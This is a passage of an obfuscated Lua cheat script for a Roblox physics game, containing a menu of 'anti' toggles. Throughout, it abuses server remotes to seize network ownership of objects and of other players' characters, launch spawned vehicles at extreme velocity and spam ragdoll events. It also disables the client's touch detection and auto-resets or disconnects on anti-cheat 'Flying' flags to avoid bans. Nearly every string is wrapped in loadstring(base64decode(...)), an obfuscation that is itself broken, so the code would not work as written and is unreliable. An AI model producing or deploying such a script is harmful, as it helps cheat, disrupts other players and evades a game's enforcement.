                    local hrp = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if hrp then hrp.Anchored = false end
                    
                    local limbs = {loadstring(base64decode("TGVmdCBBcm0="))(), loadstring(base64decode("UmlnaHQgQXJt"))(), loadstring(base64decode("TGVmdCBMZWc="))(), loadstring(base64decode("UmlnaHQgTGVn"))()}
                    for _, limbName in ipairs(limbs) do
                        local limb = char:FindFirstChild(limbName)
                        if limb then limb.CanCollide = true end
                    end
                end
            end
        end
    })
end

RunService = game:GetService('RunService')
Players = game:GetService('Players')
ReplicatedStorage = game:GetService('ReplicatedStorage')
DestroyToy = ReplicatedStorage.MenuToys.DestroyToy
SpawnToyRemoteFunction = ReplicatedStorage.MenuToys.SpawnToyRemoteFunction
GrabEvents = ReplicatedStorage.GrabEvents
SetNetworkOwner = GrabEvents.SetNetworkOwner
CharacterEvents = ReplicatedStorage.CharacterEvents
RagdollRemote = CharacterEvents.RagdollRemote
GUE = false
GUTYPE = 'CreatureBlobman'
inexistance = {}

local itm
local sp
local sv
local humconnection
local LocalPlayer = game.Players.LocalPlayer

local gucciTypes = {
    ['Blobman'] = 'CreatureBlobman',
    ['Tractor'] = 'TractorGreen',
    ['Santa Sleigh'] = 'SantaSleigh'
}

local selectedGucciType = 'CreatureBlobman'

function getCharParts()
    local char = LocalPlayer.Character
    if not char then
        return nil, nil
    end
    return char:FindFirstChild('Humanoid'), char:FindFirstChild('HumanoidRootPart')
end

hum, hrp = getCharParts()

local characterAddedConnection
gucciRunning = false

function diddle()
    if itm then
        for _, prt in pairs(itm:GetChildren())do
            if prt:IsA('BasePart') then
                prt.CanCollide = false
            end
        end
    end
    hrp.CFrame = sp
    hrp.AssemblyLinearVelocity = sv
    hum:GetPropertyChangedSignal('SeatPart'):Once(diddle)
end

function checkgrab(part)
    pcall(function()
        SetNetworkOwner:FireServer(part, part.CFrame)
    end)
end

function gucciblob()
    if gucciRunning then
        return
    end
    gucciRunning = true

    local guccion = false
    local tickyticky = tick()

    while GUE do
        hum, hrp = getCharParts()

        if hum and hrp then
            local dt = tick() - tickyticky
            tickyticky = tick()

            if itm and itm:FindFirstChild('VehicleSeat') then
                local occupant = itm.VehicleSeat.Occupant
                if occupant and occupant ~= hum then
                    task.spawn(function()
                        DestroyToy:FireServer(itm)
                    end)
                    itm = nil
                    guccion = false
                    inexistance = {}
                    task.wait(0.1)
                    if LocalPlayer.CanSpawnToy.Value then
                        task.spawn(function()
                            SpawnToyRemoteFunction:InvokeServer(selectedGucciType, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
                        end)
                    end
                    task.wait()
                    continue
                end
            end

            if itm and itm.Parent and not ((itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant ~= hum) or inexistance[itm] < 1) then
                task.spawn(function()
                    DestroyToy:FireServer(itm)
                end)
            else
                local toyFolder = workspace:FindFirstChild(LocalPlayer.Name .. 'SpawnedInToys')
                itm = toyFolder and toyFolder:FindFirstChild(selectedGucciType)
            end

            if not sp or not hum.SeatPart then
                sp = hrp.CFrame
                sv = hrp.AssemblyLinearVelocity
            end

            if humconnection ~= hum then
                humconnection = hum
                hum:GetPropertyChangedSignal('SeatPart'):Once(diddle)
            end

            local wait = true

            if itm then
                inexistance[itm] = (inexistance[itm] or 0) + dt

                if (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                    if not guccion then
                        (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    end

                    local diddy = itm.VehicleSeat
                    diddy.Parent = nil
                    diddy.Parent = itm

                    if not checkgrab(itm) and (hrp.CFrame.Position - (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).CFrame.Position).Magnitude < 28 then
                        for _, prt in pairs(itm:GetChildren())do
                            if prt:IsA('BasePart') and prt.CanQuery then
                                SetNetworkOwner:FireServer(prt, CFrame.lookAt(hrp.CFrame.Position, prt.CFrame.Position))
                            end
                        end
                    end

                    if not hum.SeatPart then
                        hum.Sit = false
                    else
                        wait = false
                        task.wait()
                    end

                    if hrp and hum and (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                        local ragdolled = hum:FindFirstChild('Ragdolled')
                        if ragdolled and ragdolled.Value then
                            guccion = false
                        end

                        if itm.VehicleSeat.Occupant == hum then
                            guccion = true
                        elseif not guccion then
                            task.wait()
                            wait = false
                            if (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')) and itm:FindFirstChild('VehicleSeat') and (not itm.VehicleSeat.Occupant or itm.VehicleSeat.Occupant == hum) then
                                local ragdolled2 = hum:FindFirstChild('Ragdolled')
                                if not ragdolled2 or not ragdolled2.Value then
                                    itm.VehicleSeat:Sit(hum)
                                    RagdollRemote:FireServer(hrp, 0.016)
                                end
                            end
                        end

                        if guccion then
                            (itm:FindFirstChild('HumanoidRootPart') or itm:FindFirstChild('SoundPart')).AssemblyLinearVelocity = Vector3.new(0, 1e15, 0)
                        else
                            if inexistance[itm] >= game.Stats.Network.ServerStatsItem['Data Ping']:GetValue() / 250 then
                                task.spawn(function()
                                    DestroyToy:FireServer(itm)
                                end)
                                hum.Sit = true
                            end
                        end
                    end
                else
                    if guccion then
                        hum.Sit = true
                    end
                    guccion = false
                    if inexistance[itm] >= 1 then
                        task.spawn(function()
                            DestroyToy:FireServer(itm)
                        end)
                        if LocalPlayer.CanSpawnToy.Value then
                            task.spawn(function()
                                SpawnToyRemoteFunction:InvokeServer(selectedGucciType, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
                            end)
                        end
                    end
                end
            else
                if guccion then
                    guccion = false
                    hum.Sit = true
                end
                if LocalPlayer.CanSpawnToy.Value then
                    task.spawn(function()
                        SpawnToyRemoteFunction:InvokeServer(selectedGucciType, hrp.CFrame * CFrame.new(0, 100000000, 10), Vector3.new(0, 0, 0))
                    end)
                end
            end

            if wait then
                task.wait()
                hum.Sit = false
            end
        else
            task.wait()
        end
    end
    gucciRunning = false
end

function onCharacterAdded(char)
    if not GUE then
        return
    end
    if itm and itm.Parent then
        task.spawn(function()
            DestroyToy:FireServer(itm)
        end)
    end
    itm = nil
    inexistance = {}
    humconnection = nil
    sp = nil
    sv = nil
    gucciRunning = false

    char:WaitForChild('Humanoid', 10)
    char:WaitForChild('HumanoidRootPart', 10)

    hum, hrp = getCharParts()
    task.wait(0.5)
    task.spawn(gucciblob)
end

if characterAddedConnection then
    characterAddedConnection:Disconnect()
end

characterAddedConnection = LocalPlayer.CharacterAdded:Connect(onCharacterAdded)

DefenseGroup:CreateDropdown({
    Name = loadstring(base64decode("R3VjY2kgVHlwZQ=="))(),
    Items = {loadstring(base64decode("QmxvYm1hbg=="))(), loadstring(base64decode("VHJhY3Rvcg=="))(), loadstring(base64decode("U2FudGEgU2xlaWdo"))()},
    Default = loadstring(base64decode("QmxvYm1hbg=="))(),
    Callback = function(Value)
        selectedGucciType = gucciTypes[Value] or 'CreatureBlobman'
    end
})

DefenseGroup:CreateToggle({
    Name = loadstring(base64decode("W0dVQ0NJXSBBbnRpIEdyYWI="))(),
    Tooltip = 'Makes you unable to be touched by anyone or anything.',
    Default = false,
    Callback = function(Value)
        GUE = Value
        if Value then
            task.spawn(gucciblob)
        else
            if itm and itm.Parent then
                task.spawn(function()
                    DestroyToy:FireServer(itm)
                end)
            end
            itm = nil
        end
    end
})

local autoGucciActiveTrain =  false
DefenseGroup:CreateToggle({
	Name = loadstring(base64decode("QW50aSBHdWNjaSAoVHJhaW4p"))(),
        Flag = loadstring(base64decode("QW50aSBHdWNjaSAoVHJhaW4p"))(),
	Default = false,
	Callback = function(Value)
        SetToggleState(loadstring(base64decode("QW50aSBHdWNjaSAoVHJhaW4p"))(), Value)
		autoGucciActiveTrain = Value
		if Value then
			startAntiGucciTrain()
			notify(loadstring(base64decode("c3lzdGVt"))(), loadstring(base64decode("R3VjY2kgYWN0aXZlIChtb25pdG9yaW5nKQ=="))(), 3)
			task.spawn(function()
				while autoGucciActiveTrain do
					local trainFolder = workspace.Map.AlwaysHereTweenedObjects
					local trainExists = trainFolder and trainFolder:FindFirstChild(loadstring(base64decode("VHJhaW4="))())
					if not trainExists then
						stopAntiGucciTrain()
						notify(loadstring(base64decode("U3lzdGVt"))(), loadstring(base64decode("VHJhaW4gbG9zdA=="))(), 3)
						local retries = 0
						repeat
							task.wait(0.2)
							retries = retries + 1
							trainFolder = workspace.Map.AlwaysHereTweenedObjects
						until (trainFolder and trainFolder:FindFirstChild(loadstring(base64decode("VHJhaW4="))())) or retries > 25 or not autoGucciActiveTrain
						if autoGucciActiveTrain and trainFolder and trainFolder:FindFirstChild(loadstring(base64decode("VHJhaW4="))()) then
							startAntiGucciTrain()
							notify(loadstring(base64decode("U3lzdGVt"))(), loadstring(base64decode("VHJhaW4gcmVzdG9yZWQu"))(), 3)
						end
					end
					task.wait(0.5)
				end
			end)
		else
			autoGucciActiveTrain = false
			stopAntiGucciTrain()
			notify(loadstring(base64decode("U3lzdGVt"))(), loadstring(base64decode("R3VjY2kgZGlzYWJsZWQu"))(), 3)
		end
	end
})

-- Anti Ragdoll (On Blob)
do
    local AntiRagBlob = false
    local RagdolledSit = false
    local Cons = {}

    local function ApplyAntiRagdoll(char)
        if not char or not AntiRagBlob then return end
        
        local hum = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWQ="))(), 5)
        local HRP = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))(), 5)
        if not (hum and HRP) then return end
        
        if Cons[loadstring(base64decode("QVJTZWF0"))()] then Cons[loadstring(base64decode("QVJTZWF0"))()]:Disconnect() end
        Cons[loadstring(base64decode("QVJTZWF0"))()] = hum:GetPropertyChangedSignal(loadstring(base64decode("U2VhdFBhcnQ="))()):Connect(function()
            if hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent.Name == loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() and not RagdolledSit then
                RagdolledSit = true
                local Seat = hum.SeatPart
                while not hum.Sit do task.wait() end
                
                ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(HRP, 3)
                
                local ragdolledVal = hum:FindFirstChild(loadstring(base64decode("UmFnZG9sbGVk"))())
                while ragdolledVal and not ragdolledVal.Value and not hum.Sit do task.wait() end
                
                task.wait(0.4)
                hum.Sit = false
                Seat:Sit(hum)
                
                task.delay(0.25, function()
                    while hum and hum.SeatPart do
                        ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(HRP, 1)
                        task.wait(0.05)
                    end
                    RagdolledSit = false
                end)
            end
        end)
    end

    DefenseGroup:CreateToggle({
        Name = loadstring(base64decode("QW50aSBSYWdkb2xsIChPbiBCbG9iKQ=="))(),
        Flag = loadstring(base64decode("QW50aVJhZ2RvbGw="))(),
        Default = false,
        Callback = function(Value)
            AntiRagBlob = Value
            RagdolledSit = false
            
            if Cons[loadstring(base64decode("QVJDaGFy"))()] then Cons[loadstring(base64decode("QVJDaGFy"))()]:Disconnect() end
            if Cons[loadstring(base64decode("QVJTZWF0"))()] then Cons[loadstring(base64decode("QVJTZWF0"))()]:Disconnect() end
            
            if AntiRagBlob then
                ApplyAntiRagdoll(Player.Character)
                Cons[loadstring(base64decode("QVJDaGFy"))()] = Player.CharacterAdded:Connect(ApplyAntiRagdoll)
            end
        end
    })
end


DefenseGroup:CreateToggle({
    Name = loadstring(base64decode("YW50aSBzbm93YmFsbA=="))(),
    Flag = loadstring(base64decode("TG9vcFJhZ2RvbGw="))(),
    Default = false,
    Callback = function(Value)
        SetToggleState(loadstring(base64decode("TG9vcFJhZ2RvbGw="))(), Value)
        loopRagdoll = Value
        
        if Value then
            task.spawn(function()
                while loopRagdoll and task.wait(0.05) do
                    pcall(function()
                        local char = Player.Character
                        local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if hrp then
                            ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0.5)
                        end
                    end)
                end
            end)
        end
    end
})
antiblob = false
antiblobConnection = nil
truePosPart = nil

DefenseGroup:CreateToggle({
    Name = loadstring(base64decode("QXV0byBSZXNldA=="))(),
        Flag = loadstring(base64decode("QXV0byBSZXNldA=="))(),
    Default = false,
    Callback = function(v)
        SetToggleState(loadstring(base64decode("QXV0byBSZXNldA=="))(), Value)
        -- Clear old connection
        if _G.AutoResetCon then _G.AutoResetCon:Disconnect() end

        if v then
            _G.AutoResetCon = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()).GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(r)
                if r == loadstring(base64decode("Rmx5aW5n"))() then
                    local char = game:GetService(loadstring(base64decode("UGxheWVycw=="))()).LocalPlayer.Character
                    local hum = char and char:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
                    
                    if hum then
                        Library:Notify(loadstring(base64decode("QXV0byBSZXNldFtQcmV2ZW50IEJhbiFd"))(), 4)
                        -- Break Joint/Health is more reliable for loadstring(base64decode("RGVmZW5zZQ=="))() than ChangeState
                        char:BreakJoints() 
                        hum.Health = 0
                    end
                end
            end)
        end
    end
})
DefenseGroup:CreateToggle({
    Name = loadstring(base64decode("QXV0byBMZWF2ZSA="))(),
    Flag = loadstring(base64decode("QXV0byBMZWF2ZQ=="))(),
    Default = false,
    Callback = function(v)
        SetToggleState(loadstring(base64decode("QXV0byBMZWF2ZQ=="))(), v)
        
        -- Clear old connection to prevent memory leaks or duplicate firing
        if _G.AutoLeaveCon then _G.AutoLeaveCon:Disconnect() end

        if v then
            local warnTimestamps = {} -- Table to track when warnings happen

            _G.AutoLeaveCon = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()).GameCorrectionEvents.GameCorrectionsNotify.OnClientEvent:Connect(function(r)
                if r == loadstring(base64decode("Rmx5aW5n"))() then
                    local currentTime = os.clock()
                    table.insert(warnTimestamps, currentTime)

                    -- Clean up timestamps that are older than 1 second
                    for xVec0uwV = #warnTimestamps, 1, -1 do
                        if currentTime - warnTimestamps[xVec0uwV] > 1 then
                            table.remove(warnTimestamps, xVec0uwV)
                        end
                    end

                    -- If 3 or more warnings happened in the last second, auto-leave
                    if #warnTimestamps >= 3 then
                        game:GetService(loadstring(base64decode("UGxheWVycw=="))()).LocalPlayer:Kick(loadstring(base64decode("WE9DVSBTYWZldHk6IERpc2Nvbm5lY3RlZCB0byBwcmV2ZW50IGJhbi4="))())
                    end
                end
            end)
        end
    end
})
DefenseGroup:CreateToggle({
    Name = loadstring(base64decode("QW50aSBWb2lk"))(),
        Flag = loadstring(base64decode("QW50aSBWb2lk"))(),
    Default = false,
    Callback = function(v)
        SetToggleState(loadstring(base64decode("QW50aSBWb2lk"))(), Value)
        if v then
            workspace.FallenPartsDestroyHeight = 0/0
        else
            workspace.FallenPartsDestroyHeight = -100
        end
    end
})

local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
local plr = game:GetService(loadstring(base64decode("UGxheWVycw=="))()).LocalPlayer
local rs = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())

local notifyCooldowns = {}
local AntiBlobConnection = nil
local AntiBlobT = false

function CheckBlob(blob, myHRP, myAttach, humanoid, source)
    local script = blob:FindFirstChild(loadstring(base64decode("QmxvYm1hblNlYXRBbmRPd25lclNjcmlwdA=="))())
    if not script then return end

    for _, side in ipairs({loadstring(base64decode("TGVmdA=="))(), loadstring(base64decode("UmlnaHQ="))()}) do
        local detector = blob:FindFirstChild(side .. loadstring(base64decode("RGV0ZWN0b3I="))())
        if not detector then continue end

        local weld = detector:FindFirstChild(side .. loadstring(base64decode("V2VsZA=="))())
        local align = detector:FindFirstChild(side .. loadstring(base64decode("QWxpZ25PcmllbnRhdGlvbg=="))())

        if weld and weld:IsA(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))()) and weld.Attachment0 == myAttach then
            local msg = source .. loadstring(base64decode("IOKGkiA="))() .. side .. loadstring(base64decode("IEdyYWI="))()
            local now = tick()

            if not notifyCooldowns[msg] or (now - notifyCooldowns[msg]) >= 2 then
    notifyCooldowns[msg] = now
    notify(loadstring(base64decode("WyDinIogXQ=="))(), msg, 3)
            end

            local success, errorMsg = pcall(function()
                rs.CharacterEvents.RagdollRemote:FireServer(myHRP, 0)

                local myChar = plr.Character
                if not myChar then return end

                local myHD = myChar:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
                local myLA = myChar:FindFirstChild(loadstring(base64decode("TGVmdCBBcm0="))())
                local myRA = myChar:FindFirstChild(loadstring(base64decode("UmlnaHQgQXJt"))())
                local myLL = myChar:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))())
                local myLR = myChar:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))())

                if humanoid then
                    humanoid.PlatformStand = true
                end

                local bodyParts = {}

                if myHRP then table.insert(bodyParts, myHRP) end
                if myHD then table.insert(bodyParts, myHD) end
                if myLA then table.insert(bodyParts, myLA) end
                if myRA then table.insert(bodyParts, myRA) end
                if myLL then table.insert(bodyParts, myLL) end
                if myLR then table.insert(bodyParts, myLR) end

                for _, part in ipairs(bodyParts) do
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end

                align.Attachment0 = nil
                weld.Attachment0 = nil
                weld.Enabled = false
                align.Enabled = false

                for _, part in ipairs(bodyParts) do
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end

                weld.Enabled = true
                align.Enabled = true

                if humanoid then
                    humanoid.PlatformStand = false
                end

                for _, part in ipairs(bodyParts) do
                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end)

            if not success then
                warn(loadstring(base64decode("Q2hlY2tCbG9iOiA="))() .. errorMsg)
            end
        end
    end
end

function AntiBlobF()
    if AntiBlobConnection then
        AntiBlobConnection:Disconnect()
        AntiBlobConnection = nil
    end

    AntiBlobConnection = RunService.Stepped:Connect(function()
        if not AntiBlobT then
            if AntiBlobConnection then
                AntiBlobConnection:Disconnect()
                AntiBlobConnection = nil
            end
            return
        end

        local myChar = plr.Character
        if not myChar then return end
        local humanoid = myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
        local myHRP = myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())

        local myAttach = myHRP and myHRP:FindFirstChild(loadstring(base64decode("Um9vdEF0dGFjaG1lbnQ="))())

        if not (myHRP and myAttach) then
            return
        end

        local inv = workspace:FindFirstChild(plr.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
        if inv then
            for _, blob in ipairs(inv:GetChildren()) do
                if blob.Name == loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() then
                    local occupantName = loadstring(base64decode("e21lfQ=="))()
                    local vehicleSeat = blob:FindFirstChild(loadstring(base64decode("VmVoaWNsZVNlYXQ="))())
                    if vehicleSeat and vehicleSeat.Occupant then
                        local character = vehicleSeat.Occupant.Parent
                        if character then
                            local player = game.Players:GetPlayerFromCharacter(character)
                            if player then
                                occupantName = player.Name
                            end
                        end
                    end
                    CheckBlob(blob, myHRP, myAttach, humanoid, occupantName)
                end
            end
        end

        for _, player in ipairs(game.Players:GetPlayers()) do
            if player ~= plr then
                local invs = workspace:FindFirstChild(player.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                if invs then
                    for _, blob in ipairs(invs:GetChildren()) do
                        if blob.Name == loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() then
                            local occupantName = player.Name
                            local vehicleSeat = blob:FindFirstChild(loadstring(base64decode("VmVoaWNsZVNlYXQ="))())
                            if vehicleSeat and vehicleSeat.Occupant then
                                local character = vehicleSeat.Occupant.Parent
                                if character then
                                    local occupantPlayer = game.Players:GetPlayerFromCharacter(character)
                                    if occupantPlayer then
                                        occupantName = occupantPlayer.Name
                                    end
                                end
                            end
                            CheckBlob(blob, myHRP, myAttach, humanoid, occupantName)
                        end
                    end
                end
            end
        end

        local plots = workspace:FindFirstChild(loadstring(base64decode("UGxvdEl0ZW1z"))())
        if plots then
            for xVec0uwV = 1, 5 do
                local plot = plots:FindFirstChild(loadstring(base64decode("UGxvdA=="))() .. xVec0uwV)
                if plot then
                    for _, blob in ipairs(plot:GetChildren()) do
                        if blob.Name == loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() then
                            local occupantName = loadstring(base64decode("UGxvdCA="))() .. xVec0uwV
                            local vehicleSeat = blob:FindFirstChild(loadstring(base64decode("VmVoaWNsZVNlYXQ="))())
                            if vehicleSeat and vehicleSeat.Occupant then
                                local character = vehicleSeat.Occupant.Parent
                                if character then
                                    local player = game.Players:GetPlayerFromCharacter(character)
                                    if player then
                                        occupantName = player.Name
                                    end
                                end
                            end
                            CheckBlob(blob, myHRP, myAttach, humanoid, occupantName)
                        end
                    end
                end
            end
        end
    end)
end

DefenseGroup:CreateToggle({
    Name = loadstring(base64decode("QW50aSBCbG9i"))(),
    Flag = loadstring(base64decode("QW50aUJsb2JLaWNr"))(),
    Default = false,
    Callback = function(Value)
        AntiBlobT = Value
        if AntiBlobT then
            AntiBlobF()
        end
    end,
})

local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
local LocalPlayer = Players.LocalPlayer

-- Fix 1: Pull helper functions OUTSIDE the callback to prevent memory leaks
local function OAA_getCharacter(player)
    return player.Character
end

local function OAA_getHumanoidRootPart(character)
    return character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
end

local function OAA_getHumanoid(character)
    return character and character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
end

local function OAA_getDistance(part1, part2)
    return (part1.Position - part2.Position).Magnitude
end

local function OAA_setNetworkOwner(part, cframe)
    task.spawn(function()
        -- Use FindFirstChild/WaitForChild safely
        local grabEvents = ReplicatedStorage:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
        if grabEvents then
            local setNetworkOwnerRemote = grabEvents:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
            if setNetworkOwnerRemote then
                setNetworkOwnerRemote:FireServer(part, cframe)
            end
        end
    end)
end

-- Fix 2: Prevent DescendantAdded from stacking multiple connections
local antiBlob1T = false
local blobConnection = nil

local function antiBlob1F()
    antiBlob1T = true
    if not blobConnection then
        blobConnection = workspace.DescendantAdded:Connect(function(toy)
            if toy.Name == loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() and antiBlob1T then
                -- Wait for child prevents errors if the detectors haven't loaded the exact microsecond the model spawns
                local leftDetector = toy:WaitForChild(loadstring(base64decode("TGVmdERldGVjdG9y"))(), 3)
                local rightDetector = toy:WaitForChild(loadstring(base64decode("UmlnaHREZXRlY3Rvcg=="))(), 3)
                
                if leftDetector then leftDetector:Destroy() end
                if rightDetector then rightDetector:Destroy() end
            end
        end)
    end
end

-- Fix 3: Use a connection variable to cleanly start/stop the Aura loop
local auraConnection = nil

DefenseGroup:CreateToggle({
    Name = loadstring(base64decode("QW50aS1CbG9ibWFuIEF1cmE="))(),
    Flag = loadstring(base64decode("QW50aS1CbG9ibWFuIEF1cmE="))(),
    Default = false,
    Callback = function(enabled)
        -- Fix 4: Changed 'Value' to 'enabled'
        if SetToggleState then
            SetToggleState(loadstring(base64decode("QW50aS1CbG9ibWFuIEF1cmE="))(), enabled)
        end

        if enabled then
            -- Clean up old loop just in case
            if auraConnection then auraConnection:Disconnect() end
            
            -- Use Heartbeat for smooth, constant checking without freezing the UI thread
            auraConnection = RunService.Heartbeat:Connect(function()
                local myCharacter = OAA_getCharacter(LocalPlayer)
                local myRootPart = OAA_getHumanoidRootPart(myCharacter)

                if not myRootPart then return end -- Skip if we are dead/respawning

                for _, player in pairs(Players:GetPlayers()) do
                    if player ~= LocalPlayer then
                        local playerCharacter = OAA_getCharacter(player)
                        local playerRootPart = OAA_getHumanoidRootPart(playerCharacter)
                        local playerHumanoid = OAA_getHumanoid(playerCharacter)

                        if playerRootPart and playerHumanoid and playerHumanoid.SeatPart then
                            local seatParent = playerHumanoid.SeatPart.Parent
                            
                            -- Check if riding Blobman and within range
                            if seatParent and seatParent.Name == loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))() then
                                if OAA_getDistance(playerRootPart, myRootPart) <= 19 then
                                    OAA_setNetworkOwner(playerRootPart, playerRootPart.CFrame)
                                end
                            end
                        end
                    end
                end
            end)
        else
            -- Disconnect the loop cleanly when toggled off
            if auraConnection then
                auraConnection:Disconnect()
                auraConnection = nil
            end
        end
    end,
})
local antiExplodeT = false
local function antiExplodeF()
	antiExplodeT = true
	local char = Player.Character
	if not char then
		return
	end
	local hrp = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
	workspace.ChildAdded:Connect(function(model)
		if model.Name == loadstring(base64decode("UGFydA=="))() and antiExplodeT then
			local mag = (model.Position - hrp.Position).Magnitude
			if mag <= 20 then
				hrp.Anchored = true
				wait(0.01)
				while char[loadstring(base64decode("UmlnaHQgQXJt"))()].RagdollLimbPart.CanCollide do
					wait(0.001)
				end
				hrp.Anchored = false
			end
		end
	end)
end
DefenseGroup:CreateToggle({
	Name = loadstring(base64decode("QW50aSBFeHBsb3Npb24="))(),
        Flag = loadstring(base64decode("QW50aSBFeHBsb3Npb24="))(), 
	Default = false,
	Callback = function(on)
        SetToggleState(loadstring(base64decode("QW50aSBFeHBsb3Npb24="))(), on)
		if on then
			antiExplodeF()
		else
			antiExplodeT = false
		end
	end
})
local hookBurnConn
local function hookBurn(char)
	local hum = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWQ="))())
	local hrp = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
	char.PrimaryPart = hrp
	if hookBurnConn then
		hookBurnConn:Disconnect()
	end
	hookBurnConn = hum.FireDebounce.Changed:Connect(function(isBurning)
		if isBurning then
			local me = char
			local oldCF = hrp.CFrame
			local plots = workspace:FindFirstChild(loadstring(base64decode("UGxvdHM="))())
			if plots and plots:FindFirstChild(loadstring(base64decode("UGxvdDI="))()) then
				local plot2 = plots.Plot2
				local barrier = plot2:FindFirstChild(loadstring(base64decode("QmFycmllcg=="))())
				local pb = barrier and barrier:FindFirstChild(loadstring(base64decode("UGxvdEJhcnJpZXI="))())
				if pb and pb:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
					local safeCF = pb.CFrame * CFrame.new(0, 6, 0)
					me:SetPrimaryPartCFrame(safeCF)
					task.wait(0.3)
					local firePart = me:FindFirstChild(loadstring(base64decode("RmlyZVBsYXllclBhcnQ="))(), true)
					if firePart then
						for _, obj in ipairs(firePart:GetChildren()) do
							if obj:IsA(loadstring(base64decode("U291bmQ="))()) then
								obj:Stop()
							end
							if obj:IsA(loadstring(base64decode("TGlnaHQ="))()) or obj:IsA(loadstring(base64decode("UGFydGljbGVFbWl0dGVy"))()) then
								obj.Enabled = false
							end
						end
						if firePart:FindFirstChild(loadstring(base64decode("Q2FuQnVybg=="))()) then
							firePart.CanBurn.Value = false
						end
						if hum:FindFirstChild(loadstring(base64decode("RmlyZURlYm91bmNl"))()) then
							hum.FireDebounce.Value = false
						end
					end
					task.wait(0.6)
					if me and me.PrimaryPart then
						me:SetPrimaryPartCFrame(oldCF)
					end
				end
			end
		end
	end)
end
DefenseGroup:CreateToggle({
	Name = loadstring(base64decode("QW50aSBCdXJu"))(),
        Flag = loadstring(base64decode("QW50aSBCdXJu"))(),
	Default = false,
	Callback = function(on)
        SetToggleState(loadstring(base64decode("QW50aSBCdXJu"))(), on)
		if on then
			hookBurn(Player.Character)
		elseif hookBurnConn then
			hookBurnConn:Disconnect()
		end
	end
})

local antiStickyT = false
DefenseGroup:CreateToggle({
	Name = loadstring(base64decode("QW50aSBTdGlja3k="))(),
        Flag = loadstring(base64decode("QW50aSBTdGlja3k="))(),
	Default = false,
	Callback = function(Value)
        SetToggleState(loadstring(base64decode("QW50aSBTdGlja3k="))(), Value)
		antiStickyT = Value
		if Player.PlayerScripts:FindFirstChild(loadstring(base64decode("U3RpY2t5UGFydHNUb3VjaERldGVjdGlvbg=="))()) then
			Player.PlayerScripts.StickyPartsTouchDetection.Disabled = Value
		end
	end,
})

DefenseGroup:CreateToggle({
	Name = loadstring(base64decode("QW50aSBMYWc="))(),
        Flag = loadstring(base64decode("QW50aSBMYWc="))(),
	Default = false,
	Callback = function(Value)
        SetToggleState(loadstring(base64decode("QW50aSBMYWc="))(), Value)
		if Value then
			local grabFolder = ReplicatedStorage:FindFirstChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
            -- ... (original deletion logic) ...
		else
			-- ... (original restoration logic) ...
		end
	end,
})

DefenseGroup:CreateToggle({
